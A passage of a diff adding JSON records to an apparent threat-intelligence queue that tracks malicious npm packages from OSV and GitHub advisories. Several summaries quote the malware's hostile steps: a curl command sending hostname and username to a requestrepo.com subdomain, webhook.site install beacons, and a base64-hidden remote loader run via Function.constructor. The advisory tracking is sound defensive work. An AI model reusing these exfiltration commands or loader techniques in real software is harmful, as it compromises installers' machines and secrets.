+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6392"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6392"
+      ],
+      "firstSeenAt": "2026-06-24T14:07:29.000Z",
+      "lastMaterialActivityAt": "2026-06-24T15:18:03.754Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T15:18:03.754Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-12f4e0e3b229009f",
+      "canonicalSubjectId": "MAL-2026-6390",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in cccmyssr-util (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (99d23c8f1194f89f1b52e986cd57ca9c0fbd739a6565eb33c972f4fbaf0966e7) On `npm install`, the package's postinstall.js unconditionally executes `exec('curl http://qvmjcw4s.requestrepo.com')`, sending an HTTP callback to a unique subdomain on requestrepo.com — a public out-of-band HTTP/DNS interaction service commonly used to confirm successful code execution on a target. The callback discloses the installer's public IP and a successful-install signal to the listener controlled by whoever registered the subdomain. The package presents itself as a trivial date-formatting utility (`index.js` exports a one-line `formatDate`), with empty author metadata and a generic `A harmless utility package` description; there is no legitimate rationale for any install-time network I/O. The cover-story metadata combined with an unconditional install-time beacon to an OOB inspection endpoint matches the reconnaissance/dependency-confusion probe pattern.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6390"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6390"
+      ],
+      "firstSeenAt": "2026-06-24T14:07:30.000Z",
+      "lastMaterialActivityAt": "2026-06-24T15:18:03.740Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T15:18:03.740Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-65f4696823972d88",
+      "canonicalSubjectId": "MAL-2026-6393",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in chai-as-predicted (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (fd7a2ff71dd341d02986c8185ea9eb18196b782f0efd9103859c0493c9f4cc78) Package name 'chai-as-predicted' impersonates the popular 'chai-as-promised' assertion library, but ships unrelated code disguised as pino logger internals. The exported middleware in index.js spawns a detached background Node process running lib/initializeCaller.js as soon as a consumer invokes it. lib/initializeCaller.js base64-decodes a hardcoded URL (https://amethyst-lorrin-26.tiiny.site/index.json) and a custom 'x-secret-key' header, performs an HTTP GET with retries, and passes the response body's.data.cookie field to `new Function.constructor('require', response)` which is then invoked with the real require — executing attacker-controlled JavaScript with full Node privileges on the installer's machine. The C2 URL and headers are stored as base64 strings inside a fake `process.env` object and decoded with atob() at runtime to evade plaintext URL scanning. The destination is an anonymous free-hosting domain with mutable, unauthenticated content. Consumers tricked by the typosquat name into requiring this package and calling its middleware will execute arbitrary remote code.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6393"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6393"
+      ],
+      "firstSeenAt": "2026-06-24T14:04:35.000Z",
+      "lastMaterialActivityAt": "2026-06-24T15:18:03.729Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T15:18:03.729Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-a900f05028bf0714",
+      "canonicalSubjectId": "MAL-2026-6391",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in cccmyssr2 (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (bd052408bb36e56e940e50ba81f7054844bc91dc0b32eaead5d15ca67f9b5c03) On `npm install`, the package's postinstall.js executes `curl \"http://r1x55270.requestrepo.com/pre?h=$(hostname)&u=$(whoami)\"`, transmitting the installer's hostname and username over plain HTTP to an attacker-controlled requestrepo.com subdomain (a known DNS/HTTP exfiltration canary service). The package otherwise has no real functionality: index.js is a trivial 3-line date stub, package.json carries placeholder metadata (\"A harmless utility package\", empty author). The lifecycle hook fires automatically during install without consent, leaking host identifiers to a third party. This is the standard install-time reconnaissance/exfiltration shape.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6391"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6391"
+      ],
+      "firstSeenAt": "2026-06-24T14:07:34.000Z",
+      "lastMaterialActivityAt": "2026-06-24T15:16:27.251Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T15:16:27.251Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-4c0066235cddce8e",
+      "canonicalSubjectId": "MAL-2026-6396",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in signup-embedder (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (c48f398f700b78d1893db4570d5d6f16985d937ee79677aab97e673a1cf86e7e) signup-embedder@99.99.99-poc2 ships preinstall.js and postinstall.js lifecycle scripts that auto-execute on `npm install`. preinstall.js collects hostname, current working directory, pid, Node version, platform/arch, user, and the list of environment variable names, and POSTs them as JSON to https://webhook.site/f83b073c-a04a-4ac5-8930-507051bd22f7; it also performs a DNS lookup against `<timestamp>.callbacks.report` for out-of-band confirmation. postinstall.js POSTs a similar host fingerprint (host, cwd, pid, node, platform) to the same webhook.site URL. The package's own description and comments label it a 'HubSpot dependency confusion PoC', and the 99.99.99-poc2 version is the canonical high-version shape used to win resolution against an internal package of the same name. Regardless of the 'PoC' framing, the package is published on the public npm registry and any installer (CI, developer machine, internal build) that resolves the name will have its host identifiers and environment variable names beaconed to an attacker-controlled collector and DNS sink, enabling internal-network mapping and follow-on targeting.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6396"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6396"
+      ],
+      "firstSeenAt": "2026-06-24T14:05:10.000Z",
+      "lastMaterialActivityAt": "2026-06-24T15:16:27.249Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T15:16:27.249Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-110ad0aa9f697bf4",
+      "canonicalSubjectId": "MAL-2026-6394",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in hs-locale-management (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (1161606183ced9cba1c4822de7f6a3515230f04ccfadd33ea2937c667cfaf1d2) Package impersonates an internal HubSpot `hs-`-scoped package using a high version (`99.99.99-poc2`) to win dependency-confusion resolution. On `npm install`, preinstall.js opens an HTTP POST to webhook.site/f83b073c-a04a-4ac5-8930-507051bd22f7 carrying the installer's hostname, current working directory, pid, OS user, platform, and a list of environment variable key names; postinstall.js sends a second beacon to the same endpoint with hostname, cwd, pid, platform, and Node version after install completes. The endpoint is an attacker-controlled webhook collector, and the package's own comments describe the behavior as a stand-in for harvesting CI/CD secrets (AWS keys, npm tokens) and source code. Both lifecycle hooks fire automatically with no user interaction.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6394"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6394"
+      ],
+      "firstSeenAt": "2026-06-24T14:01:16.000Z",
+      "lastMaterialActivityAt": "2026-06-24T15:16:27.173Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T15:16:27.173Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-67152acfd91fd840",
+      "canonicalSubjectId": "GHSA-MALWARE",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in runtime-query (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (95ac68a991ebaacd1aef772aa462ad53510471f9f4439659a6e685e877aa460e) On require(), index.js (lines 70-77) fetches JSON from https://jsonkeeper.com/b/CI3HT, extracts the `.cookie` field from the response, and passes it to `new Function.constructor('require', cookie)(require)` — compiling and executing attacker-controlled JavaScript with full access to Node's `require`. jsonkeeper.com is an anonymous, mutable paste host: the operator can swap the payload at any time without republishing the package. Any installer (or downstream package) that imports runtime-query gives the author arbitrary code execution on their machine. The package's metadata (description claims a generic query framework, empty `author`, no repository/homepage) is a cover story — the only shipped code is the 70-line remote loader. ## Source: ghsa-malware (5e87dd3327c55739c97fd3ee0f8e3afbce376ccf800ada675abd1c1d709ddd5c) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6144"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6144"
+      ],
+      "firstSeenAt": "2026-06-18T22:28:53.000Z",
+      "lastMaterialActivityAt": "2026-06-24T16:16:22.129Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T16:16:22.129Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-57659d079fa74a01",
+      "canonicalSubjectId": "GHSA-FR34-V6CP-FC49",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in normalize-plus (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: ghsa-malware (68736aa001dbb92a66fb97c6f5592b47bd0bafdcb56a325a4c8595f0b10829c7) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory",
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6399",
+        "https://github.com/advisories/GHSA-fr34-v6cp-fc49"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-fr34-v6cp-fc49",
+        "osv:MAL-2026-6399"
+      ],
+      "firstSeenAt": "2026-06-24T15:31:46.000Z",
+      "lastMaterialActivityAt": "2026-06-24T16:16:22.096Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T16:16:22.096Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-83dd949f246805ef",
+      "canonicalSubjectId": "GHSA-VH6X-853W-4QVP",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in runtime-query",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-vh6x-853w-4qvp"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-vh6x-853w-4qvp"
+      ],
+      "firstSeenAt": "2026-06-24T15:31:46.000Z",
+      "lastMaterialActivityAt": "2026-06-24T15:31:47.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T15:31:47.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-279294b53782f37d",
+      "canonicalSubjectId": "GHSA-9X83-P3MJ-P224",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in ui-core-system (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: ghsa-malware (5354cae05d6dc20a942310d00c7ae19f0cef2e44c9922322a81a950fdd798c6b) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory",
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6398",
+        "https://github.com/advisories/GHSA-9x83-p3mj-p224"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-9x83-p3mj-p224",
+        "osv:MAL-2026-6398"
+      ],
+      "firstSeenAt": "2026-06-24T14:43:58.000Z",
+      "lastMaterialActivityAt": "2026-06-24T15:31:25.374Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T15:31:25.374Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-ec46ec29c53e69d0",
+      "canonicalSubjectId": "GHSA-67GF-QG4G-4QFW",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in ldapaotest (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: ghsa-malware (e6acf213c67fc31df0f21bf872b8c8592ebc5e5af55e79884a483fad6a7ad8c4) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory",
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6397",
+        "https://github.com/advisories/GHSA-67gf-qg4g-4qfw"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-67gf-qg4g-4qfw",
+        "osv:MAL-2026-6397"
+      ],
+      "firstSeenAt": "2026-06-24T14:08:08.000Z",
+      "lastMaterialActivityAt": "2026-06-24T15:31:24.758Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T15:31:24.758Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-401c0e4af92b0d75",
+      "canonicalSubjectId": "GHSA-VVR6-9G6Q-V5W3",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in multer-express",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-vvr6-9g6q-v5w3"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-vvr6-9g6q-v5w3"
+      ],
+      "firstSeenAt": "2026-06-24T10:23:40.000Z",
+      "lastMaterialActivityAt": "2026-06-24T10:23:45.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T10:23:45.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-82544884cc3400ca",
+      "canonicalSubjectId": "GHSA-P52Q-JHM3-M38V",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in rapidsearch",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-p52q-jhm3-m38v"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-p52q-jhm3-m38v"
+      ],
+      "firstSeenAt": "2026-06-24T10:23:40.000Z",
+      "lastMaterialActivityAt": "2026-06-24T10:23:40.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T10:23:40.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-c6790d7a4fa18726",
+      "canonicalSubjectId": "GHSA-9634-PGQF-XJGR",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in vercel-api-client",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-9634-pgqf-xjgr"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-9634-pgqf-xjgr"
+      ],
+      "firstSeenAt": "2026-06-24T10:16:51.000Z",
+      "lastMaterialActivityAt": "2026-06-24T10:16:59.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T10:16:59.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
